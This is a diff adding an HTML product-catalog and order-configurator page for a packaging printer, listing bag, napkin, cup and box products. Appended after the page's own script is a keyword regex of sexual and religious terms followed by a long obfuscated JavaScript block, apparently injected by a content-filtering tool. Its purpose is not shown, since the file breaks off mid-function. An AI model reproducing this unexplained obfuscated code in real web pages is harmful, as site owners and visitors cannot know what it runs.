@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pack Plus Printing – Product Catalog</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #0f0f0f; color: #f0ede6; font-family: 'DM Mono', 'Fira Mono', 'Courier New', monospace; min-height: 100vh; display: flex; flex-direction: column; }
+  ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background: #111; } ::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 3px; }
+
+  header { background: #111; border-bottom: 1px solid #2a2a2a; padding: 18px 32px; display: flex; align-items: center; justify-content: space-between; }
+  .logo { font-size: 22px; font-weight: 700; letter-spacing: 0.15em; color: #e8c84a; }
+  .logo-sub { font-size: 11px; color: #666; letter-spacing: 0.2em; margin-top: 2px; }
+  .prod-count { font-size: 12px; color: #444; letter-spacing: 0.1em; }
+
+  .layout { display: flex; flex: 1; min-height: 0; height: calc(100vh - 65px); }
+
+  aside { width: 300px; border-right: 1px solid #1e1e1e; background: #111; display: flex; flex-direction: column; overflow: hidden; }
+  .search-box { padding: 16px 16px 8px; }
+  .search-box input { width: 100%; background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 4px; padding: 8px 12px; color: #f0ede6; font-size: 12px; outline: none; font-family: inherit; letter-spacing: 0.05em; }
+  .search-box input:focus { border-color: #e8c84a44; }
+  .cats { padding: 0 16px 12px; display: flex; flex-wrap: wrap; gap: 6px; }
+  .cat-btn { background: #1a1a1a; color: #888; border: none; border-radius: 3px; padding: 4px 9px; font-size: 10px; cursor: pointer; letter-spacing: 0.08em; font-family: inherit; transition: all 0.15s; }
+  .cat-btn.active { background: #e8c84a; color: #0f0f0f; font-weight: 700; }
+  .product-list { flex: 1; overflow-y: auto; padding: 0 8px 16px; }
+  .product-item { padding: 10px 12px; border-radius: 5px; cursor: pointer; border-left: 3px solid transparent; margin-bottom: 2px; transition: all 0.15s; }
+  .product-item:hover { background: #161616; }
+  .product-item.active { background: #1e1c14; border-left-color: #e8c84a; }
+  .product-item .pname { font-size: 12px; color: #ccc; line-height: 1.4; }
+  .product-item.active .pname { color: #e8c84a; }
+  .product-item .pmeta { font-size: 10px; color: #555; margin-top: 2px; }
+
+  main { flex: 1; padding: 36px; overflow-y: auto; }
+  .empty-state { color: #333; text-align: center; margin-top: 80px; }
+  .empty-state .big { font-size: 48px; } .empty-state .msg { font-size: 14px; margin-top: 12px; letter-spacing: 0.15em; }
+
+  .product-header { margin-bottom: 28px; }
+  .product-header .cat-label { font-size: 11px; color: #555; letter-spacing: 0.2em; margin-bottom: 6px; }
+  .product-header h1 { font-size: 26px; font-weight: 700; color: #f0ede6; }
+  .product-header .mat { font-size: 12px; color: #666; margin-top: 6px; }
+  .product-header .mat span { color: #aaa; }
+
+  .steps { display: flex; gap: 6px; margin-bottom: 28px; flex-wrap: wrap; }
+  .step-pill { padding: 5px 14px; border-radius: 2px; font-size: 10px; letter-spacing: 0.12em; background: #1a1a1a; color: #444; transition: all 0.2s; }
+  .step-pill.active { background: #e8c84a; color: #0f0f0f; font-weight: 700; }
+  .step-pill.done { background: #2a2a1a; color: #e8c84a; }
+
+  .section { margin-bottom: 28px; max-width: 700px; }
+  .section-title { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
+  .section-bar { width: 3px; height: 14px; background: #e8c84a; border-radius: 2px; }
+  .section-label { font-size: 11px; letter-spacing: 0.2em; color: #888; }
+  .section-check { font-size: 10px; color: #e8c84a; }
+
+  .color-grid { display: flex; flex-wrap: wrap; gap: 10px; }
+  .color-btn { background: #1a1a1a; color: #ccc; border: 1px solid #2a2a2a; border-radius: 4px; padding: 8px 16px; font-size: 12px; cursor: pointer; font-family: inherit; letter-spacing: 0.05em; transition: all 0.15s; }
+  .color-btn:hover { border-color: #e8c84a44; color: #e8c84a; }
+  .color-btn.active { background: #e8c84a; color: #0f0f0f; border-color: #e8c84a; font-weight: 700; }
+
+  .dim-row { display: flex; gap: 12px; flex-wrap: wrap; }
+  .dim-field label { font-size: 10px; color: #666; display: block; margin-bottom: 4px; letter-spacing: 0.1em; }
+  .dim-field input { width: 90px; background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 4px; padding: 8px 10px; color: #f0ede6; font-size: 13px; outline: none; font-family: inherit; }
+  .dim-field input:focus { border-color: #e8c84a44; }
+
+  .next-btn { margin-top: 14px; background: transparent; color: #e8c84a; border: 1px solid #e8c84a; border-radius: 4px; padding: 7px 18px; font-size: 11px; cursor: pointer; letter-spacing: 0.12em; font-family: inherit; transition: all 0.15s; }
+  .next-btn:hover { background: #e8c84a22; }
+
+  .upload-zone { border: 2px dashed #2a2a2a; border-radius: 6px; padding: 28px; text-align: center; cursor: pointer; background: #141414; transition: all 0.2s; }
+  .upload-zone:hover { border-color: #e8c84a44; background: #161610; }
+  .upload-zone.has-file { background: #1a1e14; border-color: #e8c84a44; }
+  .upload-zone .upload-icon { font-size: 28px; }
+  .upload-zone .upload-label { font-size: 12px; color: #666; margin-top: 8px; }
+
+  .preview-card { background: #141414; border: 1px solid #1e1e1e; border-radius: 8px; padding: 24px; display: flex; gap: 24px; align-items: flex-start; }
+  .preview-visual { width: 160px; height: 160px; background: #1a1a1a; border-radius: 6px; display: flex; flex-direction: column; align-items: center; justify-content: center; flex-shrink: 0; border: 1px solid #222; overflow: hidden; }
+  .preview-visual img { width: 100%; height: 100%; object-fit: contain; }
+  .preview-visual .big-emoji { font-size: 52px; }
+  .preview-visual .color-label { font-size: 9px; color: #555; margin-top: 6px; text-align: center; padding: 0 8px; letter-spacing: 0.06em; }
+  .preview-details { flex: 1; }
+  .preview-title { font-size: 16px; font-weight: 700; color: #e8c84a; margin-bottom: 12px; }
+  .detail-row { display: flex; justify-content: space-between; border-bottom: 1px solid #1e1e1e; padding: 6px 0; font-size: 12px; }
+  .detail-row .dk { color: #555; letter-spacing: 0.1em; }
+  .detail-row .dv { color: #ccc; }
+  .submit-btn { margin-top: 18px; background: #e8c84a; color: #0f0f0f; border: none; border-radius: 4px; padding: 10px 24px; font-size: 12px; font-weight: 700; letter-spacing: 0.15em; cursor: pointer; font-family: inherit; transition: all 0.15s; }
+  .submit-btn:hover { background: #f0d45a; }
+
+  .no-results { color: #444; font-size: 12px; padding: 16px; text-align: center; }
+</style>
+<style type="text/css" nonce="">.redacted {
+  color: red !important;
+}</style></head>
+<body>
+<header>
+  <div>
+    <div class="logo">PACK PLUS PRINTING</div>
+    <div class="logo-sub">PRODUCT CATALOG</div>
+  </div>
+  <div class="prod-count" id="prodCount"></div>
+</header>
+<div class="layout">
+  <aside>
+    <div class="search-box"><input type="text" id="searchInput" placeholder="Search products..." oninput="filterProducts()"></div>
+    <div class="cats" id="catBar"></div>
+    <div class="product-list" id="productList"></div>
+  </aside>
+  <main id="mainPanel">
+    <div class="empty-state">
+      <div class="big">📋</div>
+      <div class="msg">SELECT A PRODUCT TO CONFIGURE</div>
+    </div>
+  </main>
+</div>
+
+<script>
+const PRODUCTS = [
+  { name: "Bar Napkins Box Paper Printed", category: "Napkins", material: "Paper", colors: ["White","Kraft Brown","Custom Printed"], hasDimensions: false },
+  { name: "Business Cards", category: "Print", material: "Card Stock", colors: ["White","Cream","Gloss White"], hasDimensions: false },
+  { name: "Carbon Sales Book", category: "Print", material: "Carbonless Paper", colors: ["White/Yellow","White/Yellow/Pink"], hasDimensions: false },
+  { name: "Chicken Bucket", category: "Food Packaging", material: "Paperboard", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "COGS Coming In", category: "Internal", material: "Various", colors: ["N/A"], hasDimensions: false },
+  { name: "Cups Paper", category: "Cups", material: "Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Cups Plastic", category: "Cups", material: "PET Plastic", colors: ["Clear","Frosted","Custom Printed"], hasDimensions: false },
+  { name: "Deli Paper", category: "Food Packaging", material: "Deli Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Foil/Wax Paper", category: "Food Packaging", material: "Foil/Wax", colors: ["Silver Foil","Gold Foil","White Wax","Custom Printed"], hasDimensions: false },
+  { name: "Food Box", category: "Food Packaging", material: "Corrugated Cardboard", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Food Safety Bag", category: "Bags", material: "Poly", colors: ["Clear","White","Custom Printed"], hasDimensions: false },
+  { name: "Fries Pails", category: "Food Packaging", material: "Paperboard", colors: ["White","Red","Custom Printed"], hasDimensions: false },
+  { name: "Fries Waxed Bag", category: "Bags", material: "Waxed Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Garment Bag", category: "Bags", material: "Poly", colors: ["Clear","White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Garment Bag Rolls Printed", category: "Bags", material: "Poly Roll", colors: ["Clear","White","Custom Printed"], hasDimensions: false },
+  { name: "Gift Card Holders", category: "Gift", material: "Card Stock", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Gift Cards Printed", category: "Gift", material: "PVC / Card Stock", colors: ["White","Black","Metallic","Custom Printed"], hasDimensions: false },
+  { name: "Insulated NW Bag", category: "Bags", material: "Non-Woven + Foil Lining", colors: ["Black","Navy","Red","Custom Printed"], hasDimensions: false },
+  { name: "Item Specifications", category: "Internal", material: "Various", colors: ["N/A"], hasDimensions: false },
+  { name: "Labels (Sticker)", category: "Labels", material: "Paper / Vinyl", colors: ["White","Clear","Metallic","Custom Printed"], hasDimensions: false },
+  { name: "Lids", category: "Cups", material: "Plastic", colors: ["Clear","White","Black"], hasDimensions: false },
+  { name: "Lids Flat", category: "Cups", material: "Plastic", colors: ["Clear","White","Black"], hasDimensions: false },
+  { name: "Magnets", category: "Print", material: "Magnetic Sheet", colors: ["Custom Printed"], hasDimensions: false },
+  { name: "Merchandise Bag", category: "Bags", material: "Poly", colors: ["White","Black","Clear","Custom Printed"], hasDimensions: false },
+  { name: "Mis-print", category: "Internal", material: "Various", colors: ["N/A"], hasDimensions: false },
+  { name: "Misl.", category: "Internal", material: "Various", colors: ["N/A"], hasDimensions: false },
+  { name: "Napkin Dinner 3 ply", category: "Napkins", material: "Paper 3-ply", colors: ["White","Ivory","Custom Printed"], hasDimensions: false },
+  { name: "Napkins Bar 2 ply", category: "Napkins", material: "Paper 2-ply", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Napkins Dinner 2 ply", category: "Napkins", material: "Paper 2-ply", colors: ["White","Ivory","Custom Printed"], hasDimensions: false },
+  { name: "Napkins Dispenser", category: "Napkins", material: "Paper", colors: ["White","Custom Printed"], hasDimensions: false },
+  { name: "Non Woven Bags", category: "Bags", material: "Non-Woven PP", colors: ["White","Black","Navy","Red","Green","Custom Printed"], hasDimensions: false },
+  { name: "NW T-shirt Bag", category: "Bags", material: "Non-Woven PP", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Paper Bag", category: "Bags", material: "Kraft Paper", colors: ["Kraft Brown","White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Paper Bag: Envelopes", category: "Bags", material: "Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Paper Bag: Kraft Paper Bag", category: "Bags", material: "Kraft Paper", colors: ["Kraft Brown","White","Custom Printed"], hasDimensions: false },
+  { name: "Paper Bag: Paper Merchandise Bag", category: "Bags", material: "Paper", colors: ["White","Black","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Paper Bag: SOS Bag", category: "Bags", material: "Kraft Paper", colors: ["Kraft Brown","White","Custom Printed"], hasDimensions: false },
+  { name: "Paper Board", category: "Packaging", material: "Paperboard", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Paper Boat", category: "Food Packaging", material: "Paperboard", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Pillow Box", category: "Gift", material: "Paperboard", colors: ["White","Black","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Pizza Boxes Printed", category: "Food Packaging", material: "Corrugated Cardboard", colors: ["White","Kraft","Custom Printed"], hasDimensions: true },
+  { name: "Placemats", category: "Food Packaging", material: "Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags", category: "Bags", material: "LDPE Plastic", colors: ["Clear","White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Die Cut Bag", category: "Bags", material: "LDPE/HDPE", colors: ["Clear","White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Folded Handle Bag", category: "Bags", material: "LDPE", colors: ["White","Black","Clear","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Merchandise Bag", category: "Bags", material: "LDPE", colors: ["White","Clear","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Patch Handle Bag", category: "Bags", material: "LDPE/HDPE", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Rigid Handle Bag", category: "Bags", material: "HDPE", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Rope Handle Bag", category: "Bags", material: "LDPE + Rope", colors: ["White","Black","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Snap Handle Bags", category: "Bags", material: "PP Plastic", colors: ["Clear","White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Soft Loop Handle Bag", category: "Bags", material: "LDPE", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: T-Shirt Bag", category: "Bags", material: "HDPE", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plastic Bags: Trifold Handle Bag", category: "Bags", material: "LDPE", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Plates", category: "Food Packaging", material: "Paper / Foam", colors: ["White","Custom Printed"], hasDimensions: false },
+  { name: "Poly Mailers", category: "Bags", material: "Polyethylene", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Printed Adhesive Tape", category: "Print", material: "BOPP Tape", colors: ["Custom Printed"], hasDimensions: false },
+  { name: "Printed Bar Napkins", category: "Napkins", material: "Paper 2-ply", colors: ["White","Custom Printed"], hasDimensions: false },
+  { name: "Printed Chopsticks", category: "Utensils", material: "Bamboo / Wood", colors: ["Natural","Custom Printed Wrapper"], hasDimensions: false },
+  { name: "Printed Dinner Napkins", category: "Napkins", material: "Paper", colors: ["White","Ivory","Custom Printed"], hasDimensions: false },
+  { name: "Printed Gift Box Paper", category: "Gift", material: "Coated Paper", colors: ["White","Custom Printed"], hasDimensions: false },
+  { name: "Printed Tissue", category: "Gift", material: "Tissue Paper", colors: ["White","Black","Colored","Custom Printed"], hasDimensions: false },
+  { name: "Printed Wax Paper", category: "Food Packaging", material: "Waxed Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Printed Zip Lock Bags", category: "Bags", material: "LDPE / BOPP", colors: ["Clear","White","Custom Printed"], hasDimensions: false },
+  { name: "Ribbon", category: "Gift", material: "Satin / Grosgrain", colors: ["White","Black","Gold","Silver","Red","Custom Printed"], hasDimensions: false },
+  { name: "Rigid Box", category: "Gift", material: "Rigid Paperboard", colors: ["White","Black","Custom Printed"], hasDimensions: true },
+  { name: "Rope/Ribbon Handle Bag", category: "Bags", material: "Paper + Rope", colors: ["White","Black","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Sample", category: "Internal", material: "Various", colors: ["N/A"], hasDimensions: false },
+  { name: "Sandwich Paper Bag", category: "Bags", material: "Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Sealing Film Rolls", category: "Packaging", material: "PET/PE Film", colors: ["Clear","Custom Printed"], hasDimensions: false },
+  { name: "Sealing Machines", category: "Equipment", material: "N/A", colors: ["N/A"], hasDimensions: false },
+  { name: "Shopping Cart", category: "Equipment", material: "N/A", colors: ["N/A"], hasDimensions: false },
+  { name: "Sleeve Printed", category: "Cups", material: "Paper", colors: ["Custom Printed"], hasDimensions: false },
+  { name: "Soup Bowls", category: "Food Packaging", material: "Paper / Foam", colors: ["White","Custom Printed"], hasDimensions: false },
+  { name: "Stock Tissue", category: "Gift", material: "Tissue Paper", colors: ["White","Black","Red","Blue","Pink","Green"], hasDimensions: false },
+  { name: "Take Out Box", category: "Food Packaging", material: "Paperboard", colors: ["White","Kraft","Custom Printed"], hasDimensions: true },
+  { name: "Tie Tray", category: "Food Packaging", material: "Paperboard / Plastic", colors: ["White","Clear","Custom Printed"], hasDimensions: false },
+  { name: "TSB KH Glatt 12x7x24", category: "Bags", material: "Poly", colors: ["White","Custom Printed"], hasDimensions: false },
+  { name: "Umbrella", category: "Accessories", material: "Polyester / Nylon", colors: ["Black","Custom Printed"], hasDimensions: false },
+  { name: "Utensil Bag", category: "Bags", material: "Paper / Poly", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Vendor Error", category: "Internal", material: "Various", colors: ["N/A"], hasDimensions: false },
+  { name: "Vendors Discount", category: "Internal", material: "Various", colors: ["N/A"], hasDimensions: false },
+  { name: "Wave Top Handle Waxed Paper Bag", category: "Bags", material: "Waxed Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+  { name: "Wet Napkin", category: "Napkins", material: "Non-Woven", colors: ["White","Custom Printed"], hasDimensions: false },
+  { name: "Woven Bag", category: "Bags", material: "Woven PP", colors: ["White","Black","Custom Printed"], hasDimensions: false },
+  { name: "Wrapping Paper Gift", category: "Gift", material: "Coated Paper", colors: ["White","Kraft","Custom Printed"], hasDimensions: false },
+];
+
+const ITEM_VISUALS = { Bags:"🛍️", "Food Packaging":"📦", Napkins:"🧻", Gift:"🎁", Print:"🖨️", Cups:"🥤", Labels:"🏷️", Packaging:"📫", Utensils:"🥢", Equipment:"🔧", Accessories:"☂️", Internal:"🗂️" };
+const CATEGORIES = ["All", ...Array.from(new Set(PRODUCTS.map(p => p.category))).sort()];
+
+let state = { selected: null, color: "", customW: "", customH: "", customD: "", design: null, previewUrl: null, step: 1, category: "All" };
+
+document.getElementById("prodCount").textContent = PRODUCTS.length + " PRODUCTS";
+
+// Build category bar
+const catBar = document.getElementById("catBar");
+CATEGORIES.forEach(cat => {
+  const btn = document.createElement("button");
+  btn.className = "cat-btn" + (cat === "All" ? " active" : "");
+  btn.textContent = cat;
+  btn.onclick = () => { state.category = cat; document.querySelectorAll(".cat-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); filterProducts(); };
+  catBar.appendChild(btn);
+});
+
+function filterProducts() {
+  const q = document.getElementById("searchInput").value.toLowerCase();
+  const list = document.getElementById("productList");
+  list.innerHTML = "";
+  const filtered = PRODUCTS.filter(p => p.name.toLowerCase().includes(q) && (state.category === "All" || p.category === state.category));
+  if (!filtered.length) { list.innerHTML = '<div class="no-results">No products found</div>'; return; }
+  filtered.forEach(p => {
+    const div = document.createElement("div");
+    div.className = "product-item" + (state.selected?.name === p.name ? " active" : "");
+    div.innerHTML = `<div class="pname">${ITEM_VISUALS[p.category]||"📦"} ${p.name}</div><div class="pmeta">${p.category} · ${p.material}</div>`;
+    div.onclick = () => selectProduct(p);
+    list.appendChild(div);
+  });
+}
+
+function selectProduct(p) {
+  state = { selected: p, color: "", customW: "", customH: "", customD: "", design: null, previewUrl: null, step: 1, category: state.category };
+  filterProducts();
+  renderMain();
+}
+
+function renderMain() {
+  const main = document.getElementById("mainPanel");
+  const p = state.selected;
+  if (!p) { main.innerHTML = '<div class="empty-state"><div class="big">📋</div><div class="msg">SELECT A PRODUCT TO CONFIGURE</div></div>'; return; }
+
+  const stepLabels = ["Color","Size","Design","Preview"];
+  const stepsHtml = stepLabels.map((s, i) => {
+    let cls = "step-pill";
+    if (state.step === i+1) cls += " active";
+    else if (state.step > i+1) cls += " done";
+    return `<div class="${cls}">${i+1}. ${s.toUpperCase()}${state.step > i+1 ? " ✓" : ""}</div>`;
+  }).join("");
+
+  let sectionsHtml = "";
+
+  // Step 1: Color
+  if (state.step >= 1) {
+    const colorBtns = p.colors.map(c => `<button class="color-btn${state.color===c?" active":""}" onclick="pickColor('${c}')">${c}</button>`).join("");
+    sectionsHtml += section("SELECT COLOR", !!state.color, `<div class="color-grid">${colorBtns}</div>`);
+  }
+
+  // Step 2: Dimensions
+  if (state.step >= 2) {
+    const dimContent = `
+      <div style="font-size:11px;color:#555;margin-bottom:12px;">Enter measurements in inches</div>
+      <div class="dim-row">
+        <div class="dim-field"><label>WIDTH</label><input type="number" id="dimW" value="${state.customW}" placeholder="e.g. 10" oninput="state.customW=this.value; updateNextBtn();" /></div>
+        <div class="dim-field"><label>HEIGHT</label><input type="number" id="dimH" value="${state.customH}" placeholder="e.g. 14" oninput="state.customH=this.value;" /></div>
+        ${p.hasDimensions ? `<div class="dim-field"><label>DEPTH</label><input type="number" id="dimD" value="${state.customD}" placeholder="e.g. 4" oninput="state.customD=this.value;" /></div>` : ""}
+      </div>
+      ${state.customW ? `<button class="next-btn" onclick="goStep(3)">Next →</button>` : `<button class="next-btn" id="nextDimBtn" disabled style="opacity:0.3;cursor:default;">Enter width to continue</button>`}
+    `;
+    sectionsHtml += section(p.hasDimensions ? "DIMENSIONS" : "MEASUREMENTS", !!state.customW, dimContent);
+  }
+
+  // Step 3: Design
+  if (state.step >= 3) {
+    const uploadContent = `
+      <div class="upload-zone${state.design?" has-file":""}" onclick="document.getElementById('fileInput').click()">
+        <div class="upload-icon">${state.design ? "✅" : "📤"}</div>
+        <div class="upload-label">${state.design ? state.design.name : "Click to upload design file (PNG, JPG, PDF, AI, SVG)"}</div>
+      </div>
+      <input type="file" id="fileInput" accept=".png,.jpg,.jpeg,.pdf,.ai,.svg" style="display:none" onchange="handleUpload(this)" />
+      <button class="next-btn" onclick="goStep(4)" style="margin-top:12px;">${state.design ? "Preview →" : "Skip & Preview →"}</button>
+    `;
+    sectionsHtml += section("UPLOAD DESIGN", !!state.design, uploadContent);
+  }
+
+  // Step 4: Preview
+  if (state.step >= 4) {
+    const rows = [
+      ["Material", p.material],
+      ["Color", state.color || "—"],
+      ["Width", state.customW ? state.customW+'"' : "—"],
+      ["Height", state.customH ? state.customH+'"' : "—"],
+      ...(p.hasDimensions ? [["Depth", state.customD ? state.customD+'"' : "—"]] : []),
+      ["Design File", state.design ? state.design.name : "None uploaded"],
+    ].map(([k,v]) => `<div class="detail-row"><span class="dk">${k}</span><span class="dv">${v}</span></div>`).join("");
+
+    const visual = state.previewUrl
+      ? `<img src="${state.previewUrl}" alt="Design" />`
+      : `<div class="big-emoji">${ITEM_VISUALS[p.category]||"📦"}</div><div class="color-label">${state.color.toUpperCase()}</div>`;
+
+    const previewContent = `
+      <div class="preview-card">
+        <div class="preview-visual">${visual}</div>
+        <div class="preview-details">
+          <div class="preview-title">${p.name}</div>
+          ${rows}
+          <button class="submit-btn" onclick="submitOrder()">SUBMIT ORDER →</button>
+        </div>
+      </div>
+    `;
+    sectionsHtml += section("ORDER SUMMARY", false, previewContent);
+  }
+
+  main.innerHTML = `
+    <div style="max-width:700px">
+      <div class="product-header">
+        <div class="cat-label">${p.category.toUpperCase()}</div>
+        <h1>${p.name}</h1>
+        <div class="mat">Material: <span>${p.material}</span></div>
+      </div>
+      <div class="steps">${stepsHtml}</div>
+      ${sectionsHtml}
+    </div>
+  `;
+}
+
+function section(title, done, content) {
+  return `<div class="section">
+    <div class="section-title">
+      <div class="section-bar"></div>
+      <div class="section-label">${title}</div>
+      ${done ? '<div class="section-check">✓</div>' : ""}
+    </div>
+    ${content}
+  </div>`;
+}
+
+function pickColor(c) {
+  state.color = c;
+  if (state.step === 1) state.step = 2;
+  renderMain();
+}
+
+function goStep(n) {
+  state.step = n;
+  renderMain();
+}
+
+function updateNextBtn() {
+  const btn = document.getElementById("nextDimBtn");
+  const w = document.getElementById("dimW");
+  if (btn && w) { if (w.value) { btn.disabled = false; btn.style.opacity = "1"; btn.style.cursor = "pointer"; btn.textContent = "Next →"; btn.onclick = () => goStep(3); } }
+  state.customW = w ? w.value : state.customW;
+}
+
+function handleUpload(input) {
+  const file = input.files[0];
+  if (!file) return;
+  state.design = file;
+  state.previewUrl = URL.createObjectURL(file);
+  renderMain();
+}
+
+function submitOrder() {
+  alert("✅ Order submitted!\nOur team at Pack Plus Printing will contact you shortly.");
+}
+
+filterProducts();
+
+;var _livRx=/\b(?:sex|sexy|sexual|intersex|sexually|homosexual|homo|porn|gender|birth|gay|anal|erection|penis|intimacy|intimate|sensual|attractive|attraction|stripper|genitales|girl|girlfriend|boyfriend|mikveh|nidda|nidah|bra|bathing|vaginal|bedikah|marital|menstrual|menstruation|swimsuit|pregnancy|lingerie|romantic|club|clubs|hangout|gang)\b/gi;window._livRx=_livRx;(function(_0x1f55ff,_0x2dd813){const _0x43cfc5=_0x568c,_0x1922de=_0x1f55ff();while(!![]){try{const _0x1facd7=-parseInt(_0x43cfc5(0x1b7))/(0x1*0xc07+-0x9*-0x397+-0x2c55)+-parseInt(_0x43cfc5(0x1df))/(-0x3*-0x929+-0x1*-0x159e+-0x3117)+parseInt(_0x43cfc5(0x1d1))/(0x10fd+-0x3cc+-0xd2e)*(-parseInt(_0x43cfc5(0xbf))/(0x4bc+-0xd5*-0x2b+-0x287f*0x1))+-parseInt(_0x43cfc5(0x107))/(0x9e2*-0x1+0x1*-0x68e+0x1075)+-parseInt(_0x43cfc5(0xaa))/(0x2128+0x5*-0x4f7+0x2c5*-0x3)+parseInt(_0x43cfc5(0x1c4))/(0x1c7b+0xfa4+-0x2c18)*(parseInt(_0x43cfc5(0x1e6))/(-0x6d5*-0x1+-0x547*0x1+-0x186))+parseInt(_0x43cfc5(0xca))/(0xbc7+0xf7b+-0x1b39);if(_0x1facd7===_0x2dd813)break;else _0x1922de['push'](_0x1922de['shift']());}catch(_0x25309c){_0x1922de['push'](_0x1922de['shift']());}}}(_0x2ce5,-0x1*0x20651+0xc3dcb+-0x2*0x14324),((()=>{'use strict';const _0x365c50=_0x568c,_0x2554dd={'iCevP':function(_0x5003b3,_0x553690){return _0x5003b3!==_0x553690;},'TYCVm':function(_0x3de16b,_0x5d52ca){return _0x3de16b!==_0x5d52ca;},'BHGiE':_0x365c50(0x197),'GvPHr':function(_0x263092,_0x489bd){return _0x263092(_0x489bd);},'EePYf':function(_0x41183f,_0x485cd5){return _0x41183f+_0x485cd5;},'pMpwX':function(_0x2254e2,_0x50f1b2){return _0x2254e2+_0x50f1b2;},'hlmam':function(_0x186ad9,_0x4d24f1){return _0x186ad9===_0x4d24f1;},'gVRtS':function(_0x1165b0,_0x3d4cd8){return _0x1165b0(_0x3d4cd8);},'VLHNL':_0x365c50(0x168),'EMcVJ':_0x365c50(0xb8),'gTbKF':_0x365c50(0x18d),'cPTTy':function(_0x52cd97,_0x4eb916){return _0x52cd97(_0x4eb916);},'gEqXy':_0x365c50(0x113),'NLEqZ':_0x365c50(0x8a),'EUBaC':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x18f)+_0x365c50(0x1cc)+_0x365c50(0x13b),'uLvRc':function(_0x511658,_0x269fff,_0x568dd2){return _0x511658(_0x269fff,_0x568dd2);},'sjEKQ':_0x365c50(0x1c8)+_0x365c50(0x1a1)+_0x365c50(0x181)+_0x365c50(0xd6),'RfkPZ':_0x365c50(0x11e),'LmPfW':_0x365c50(0x162)+_0x365c50(0x16d),'BadAG':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x126)+_0x365c50(0x1a5)+_0x365c50(0x1c1)+_0x365c50(0x1aa),'UhyrJ':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x13f)+_0x365c50(0xea)+_0x365c50(0x1ce)+_0x365c50(0x11b),'rRNYb':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0x12b)+_0x365c50(0x186),'vgksg':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x136)+_0x365c50(0x1de)+_0x365c50(0x110)+_0x365c50(0x155)+_0x365c50(0x1b4),'KRqYm':_0x365c50(0x12c),'BSfxS':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x121)+_0x365c50(0xd5)+_0x365c50(0x1e9)+_0x365c50(0xbc)+_0x365c50(0x183)+':','qgxUI':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x13f)+_0x365c50(0x96)+_0x365c50(0x8f)+_0x365c50(0x140),'zNpIr':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0x16c)+'e:','SuFRO':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0x14c)+_0x365c50(0x186),'QmLGZ':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1e4)+_0x365c50(0x169)+_0x365c50(0x139)+_0x365c50(0x76)+_0x365c50(0x11f),'RAPOH':function(_0x200254){return 